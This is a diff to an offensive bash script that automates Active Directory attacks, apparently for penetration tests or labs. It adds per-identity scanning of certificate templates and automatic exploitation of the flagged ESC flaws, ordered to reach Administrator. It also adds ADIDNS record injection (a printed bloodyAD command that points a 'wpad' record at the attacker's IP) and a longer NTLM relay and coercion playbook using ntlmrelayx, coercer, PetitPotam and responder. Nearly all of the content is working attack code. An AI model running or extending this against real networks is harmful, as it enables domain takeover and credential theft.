@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.13.0"
+readonly VERSION="1.14.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -836,44 +836,45 @@ phase_kerberoast() {
 # ===========================================================================
 #  PHASE 7 — ADCS / CERTIPY  (vulnerable certificate templates)
 # ===========================================================================
+ADCS_PWNED=0       # set once an ESC yields Administrator → stop re-issuing certs
 phase_adcs() {
     [[ "$HAVE_AUTH" != "1" ]] && return
     section "PHASE 7 · ADCS — VULNERABLE CERTIFICATE TEMPLATES (Certipy)"
     have certipy || { warn "certipy unavailable, skipping"; return; }
+    [[ "$ADCS_PWNED" == "1" ]] && { info "Already escalated to Administrator via ADCS — skipping"; return; }
 
-    subsection "certipy find — scanning for ESC1..ESC16"
-    # certipy's Kerberos LDAP bind is unreliable (fails with 'invalidCredentials …
-    # data 52e/57'), and most labs keep NTLM enabled — so PREFER password/hash auth
-    # and hand certipy the DC's DNS name via -target (it needs it). Fall back to
-    # Kerberos (with -dc-host + KRB5CCNAME) only when that's all we have, or when
-    # the password/NTLM bind is refused (i.e. NTLM disabled on the DC).
-    local cbase=(-u "${USER}@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=()
+    # IMPORTANT: `certipy find -vulnerable` flags a template as abusable only if THE
+    # CURRENT USER can enrol in it — so abusability is PER-IDENTITY, not domain-wide.
+    # A template (e.g. an ESC15 WebServer) may be invisible to the first user yet
+    # exploitable by a later pivot that holds enrolment rights. That's why we re-run
+    # the scan for each identity (the timeout -k guard keeps a hang from stalling us).
+    subsection "certipy find — what THIS identity (${USER}) can abuse (ESC1..ESC16)"
+    # certipy's Kerberos LDAP bind is unreliable (fails 'invalidCredentials data
+    # 52e/57'), and most labs keep NTLM enabled — PREFER password/hash + -target;
+    # fall back to Kerberos only when that's all we have or NTLM is refused.
+    local cbase=(-u "${USER}@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=() cout
     if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS")
     elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH")
     elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
     run "certipy find ${cbase[*]} ${cauth[*]} -stdout -vulnerable"
-    local cout; cout=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
-    # Password/NTLM bind refused but we have a ticket → retry over Kerberos.
+    cout=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
     if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|STATUS_' <<<"$cout" \
        && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
         warn "certipy password/NTLM bind failed → retrying over Kerberos"
         cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
         cout=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
     fi
-    echo "$cout" | tee -a "$LOGFILE"; echo "$cout" >"$OUTDIR/certipy_find.txt"
+    echo "$cout" | tee -a "$LOGFILE"; echo "$cout" >"$OUTDIR/certipy_find_$(_safe_name "$USER").txt"
 
-    # full structured output (BloodHound + JSON) for later analysis
-    "${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -output "$OUTDIR/certipy" >/dev/null 2>&1
-
-    if echo "$cout" | grep -qiE 'ESC[0-9]+'; then
-        local escs; escs=$(echo "$cout" | grep -oiE 'ESC[0-9]+' | sort -u | tr '\n' ' ')
-        loot "★★★ Vulnerable ADCS detected: $escs ★★★"
-        warn "Review certipy_find.txt — possible escalation to Domain Admin via certificates"
-        echo "$cout" | grep -iE 'Template Name|ESC[0-9]+|Enrollment Rights|Vulnerab' | sed 's/^/      /'
-        info "e.g. ESC1:  certipy req -u $USER@$DOMAIN -ca <CA> -template <TPL> -upn administrator@$DOMAIN -dc-ip $DC_IP"
-        _abuse_adcs "$cout"
+    if grep -qiE 'ESC[0-9]+' <<<"$cout"; then
+        local escs; escs=$(grep -oiE 'ESC[0-9]+' <<<"$cout" | sort -u | tr '\n' ' ')
+        loot "★★★ ${USER} can abuse ADCS: $escs ★★★"
+        grep -iE 'Template Name|ESC[0-9]+|Enrollment Rights|Vulnerab' <<<"$cout" | sed 's/^/      /'
+        # structured dump for analysis (best-effort)
+        "${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -output "$OUTDIR/certipy_$(_safe_name "$USER")" >/dev/null 2>&1
+        _abuse_adcs "$cout" && ADCS_PWNED=1
     else
-        info "No automatically exploitable templates detected"
+        info "No templates ${USER} can abuse (enrolment rights gate ESC detection — a later identity may differ)"
     fi
 }
 
@@ -1117,12 +1118,20 @@ phase_relay() {
     $NXC smb "$DCT" "${args[@]}" -M webdav  2>&1 | tee -a "$LOGFILE" | grep -qi 'running\|enabled' \
         && loot "★ WebClient (WebDAV) running → HTTP coercion → relay to LDAP/ADCS"
 
-    subsection "Relay playbook (run these yourself — needs your listeners)"
-    echo -e "      ${C_GREY}# 1) Relay to LDAPS and escalate (RBCD/shadow-cred), or -t smb://<other-host>:${C_RESET}"
-    echo -e "      ${C_CYAN}impacket-ntlmrelayx -t ldaps://$DC_IP --escalate-user $USER -smb2support${C_RESET}"
-    echo -e "      ${C_GREY}# 2) Coerce the DC to auth to you (${lhost:-<your-ip>}):${C_RESET}"
-    echo -e "      ${C_CYAN}coercer coerce -l ${lhost:-<your-ip>} -t $DC_IP -d $DOMAIN -u $USER -p '<pass>'${C_RESET}"
-    echo -e "      ${C_GREY}# or passively: ${C_CYAN}sudo responder -I tun0${C_GREY} to poison & capture NetNTLM hashes${C_RESET}"
+    subsection "Relay playbook (run these yourself — needs your listener)"
+    local ip="${lhost:-<your-ip>}" ca="${DC_FQDN:-$DCT}"
+    echo -e "      ${C_GREY}# Start ONE relay listener (target must be a DIFFERENT host than the one you coerce):${C_RESET}"
+    echo -e "      ${C_GREY}# (A) ADCS web enrollment → cert for the relayed machine (ESC8, most reliable if HTTP/S enrolment is up):${C_RESET}"
+    echo -e "      ${C_CYAN}impacket-ntlmrelayx -t http://$ca/certsrv/certfnsh.asp -smb2support --adcs --template DomainController${C_RESET}"
+    echo -e "      ${C_GREY}# (B) LDAP → RBCD (adds a computer + delegation on the relayed machine account):${C_RESET}"
+    echo -e "      ${C_CYAN}impacket-ntlmrelayx -t ldaps://$DC_IP -smb2support --delegate-access --no-dump${C_RESET}"
+    echo -e "      ${C_GREY}# (C) LDAP → grant a user DCSync (relay a privileged account/DC):${C_RESET}"
+    echo -e "      ${C_CYAN}impacket-ntlmrelayx -t ldaps://$DC_IP -smb2support --escalate-user '$USER'${C_RESET}"
+    echo -e "      ${C_GREY}# (D) LDAP → Shadow Credentials on the relayed account:${C_RESET}"
+    echo -e "      ${C_CYAN}impacket-ntlmrelayx -t ldaps://$DC_IP -smb2support --shadow-credentials --shadow-target '<victim>'${C_RESET}"
+    echo -e "      ${C_GREY}# Then COERCE the DC to authenticate to you ($ip):${C_RESET}"
+    echo -e "      ${C_CYAN}coercer coerce -u '$USER' -p '<pass>' -d $DOMAIN -l $ip -t $DC_IP${C_RESET}"
+    echo -e "      ${C_GREY}# or: petitpotam.py / printerbug.py / dfscoerce.py · passive: ${C_CYAN}sudo responder -I <iface>${C_RESET}"
 }
 
 # ===========================================================================
@@ -1405,9 +1414,15 @@ phase_acl() {
                 elif grep -qiE 'objectClass:.*\borganizationalUnit\b' <<<"$_obj"; then cur_class="ou"
                 elif grep -qiE 'objectClass:.*\buser\b'               <<<"$_obj"; then cur_class="user"; fi
             fi
-            # Domain head (DC=…,DC=… with no CN) → writeDacl here means DCSync
+            # DC=…,DC=… with no CN. Two very different beasts:
+            #  · a DNS zone (…,CN=MicrosoftDNS,…) → ADIDNS record injection
+            #  · the domain head itself           → writeDacl here means DCSync
             if [[ -z "$cur_name" && "$cur_dn" =~ ^[Dd][Cc]= ]]; then
-                cur_name="${DOMAIN:-domain}"; cur_sam="$cur_name"; cur_class="domain"
+                if [[ "$cur_dn" =~ [Mm]icrosoft[Dd][Nn][Ss]|DnsZones ]]; then
+                    cur_name="${cur_dn%%,*}"; cur_class="dns"; cur_sam="$cur_name"
+                else
+                    cur_name="${DOMAIN:-domain}"; cur_sam="$cur_name"; cur_class="domain"
+                fi
             fi
         fi
         [[ "$line" =~ objectClass.*group ]]    && cur_class="group"
@@ -1422,6 +1437,7 @@ phase_acl() {
         if   [[ "$ll" == *keycredentiallink* ]]; then act="shadow"
         elif [[ "$ll" == *allowedtoactonbehalfofotheridentity* ]]; then act="rbcd"
         elif [[ "$ll" == *serviceprincipalname* ]]; then act="spn"
+        elif [[ "$cur_class" == "dns" && ( "$ll" == *create_child* || "$ll" == *writeproperty* || "$ll" == *genericall* ) ]]; then act="dns"
         # Any right that lets us write a GROUP's membership → add ourselves. This
         # must catch AddSelf (Self-Membership) and AddMember too, which bloodyAD
         # surfaces as 'member'/'self', NOT as GenericAll — so keying only on
@@ -1441,6 +1457,8 @@ phase_acl() {
             shadow) warn "Writable msDS-KeyCredentialLink on ${C_BOLD}$cur_name${C_RESET} → Shadow Credentials"; _abuse_shadowcred "$tgt" ;;
             rbcd)   warn "Writable RBCD attr on ${C_BOLD}$cur_name${C_RESET} → Resource-Based Delegation"; _abuse_rbcd "$tgt" ;;
             spn)    _abuse_writespn "$tgt" ;;
+            dns)    warn "Writable DNS zone (${C_BOLD}${cur_name}${C_RESET}) → ${C_BOLD}ADIDNS${C_RESET} record injection (BloodHound usually misses this one)"
+                    detail "      bloodyAD --host $DCT --dc-ip $DC_IP -d $DOMAIN -u $USER -k add dnsRecord wpad <YOUR_IP>   # or wildcard '*' → coerce/relay / NetNTLM capture (needs your listener)" ;;
             group)  warn "Writable GROUP membership: ${C_BOLD}$cur_name${C_RESET}"; _abuse_group "$tgt" ;;
             full)
                 warn "Full control over ${C_BOLD}$cur_name${C_RESET} (${cur_class:-?})"
@@ -1784,15 +1802,22 @@ _abuse_adcs() {
     # Only the ESC(s) certipy actually flagged on THIS CA — we don't sweep 1..16,
     # we exploit exactly what's present (one, or several), and stop the moment one
     # lands Administrator.
-    local escs; escs=$(grep -oiE 'ESC[0-9]+' <<<"$cout" | tr 'a-z' 'A-Z' | sort -u -V)
-    [[ -z "$escs" ]] && return 1
-    loot "ADCS vulnerabilities identified: $(echo "$escs" | paste -sd' ' -)"
+    local found; found=$(grep -oiE 'ESC[0-9]+' <<<"$cout" | tr 'a-z' 'A-Z' | sort -u -V)
+    [[ -z "$found" ]] && return 1
+    loot "ADCS vulnerabilities identified: $(echo "$found" | paste -sd' ' -)"
     [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to auto-exploit the flagged ESC(s) and pivot to Administrator)"; return 1; }
     [[ -z "$ca" ]] && { warn "Could not parse CA name — exploit ADCS manually (see certipy_find.txt)"; return 1; }
 
+    # When SEVERAL are present, try them in a RELIABILITY/SAFETY order, not numeric:
+    # clean direct-impersonation first; template/CA-modifying and relay (need a
+    # listener / leave artifacts) last. Stop at the first that yields Administrator.
+    local esc tpl escs="" e
+    for e in ESC1 ESC2 ESC6 ESC9 ESC10 ESC16 ESC15 ESC3 ESC13 ESC4 ESC7 ESC8 ESC11 ESC5 ESC14; do
+        grep -qiw "$e" <<<"$found" && escs+="$e "
+    done
+    for e in $found; do grep -qiw "$e" <<<"$escs" || escs+="$e "; done   # any new/unknown ESCs last
     _ADCS_SID="$(_adcs_admin_sid)"      # for strong-mapping (-sid); empty is fine
-    local esc tpl
-    for esc in $escs; do                # $escs = the flagged ones only, not a 1..16 sweep
+    for esc in $escs; do                # flagged ones only, in priority order
         tpl=$(_adcs_template_for "$cout" "$esc"); [[ -z "$tpl" ]] && tpl="User"
         case "$esc" in
             ESC1|ESC2|ESC6)  _adcs_req_admin "$ca" "$tpl" "$esc" 1 && return 0 ;;   # SAN impersonation (+SID)
